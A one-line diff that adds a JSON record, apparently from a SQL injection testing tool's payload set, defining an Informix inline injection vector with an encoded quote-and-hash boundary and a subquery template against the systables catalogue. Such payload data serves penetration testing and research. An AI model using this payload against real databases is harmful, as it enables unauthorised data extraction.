@@ -1,0 +1,1 @@
+{"dbms": "informix", "technique": "inline", "boundary": {"prefix": "'%23", "suffix": "", "type": "single-enc-hash"}, "vector": "{B} AND 1=(SELECT ({Q}) FROM systables WHERE 1=1)", "comment": "informix inline: single+enc hash"}
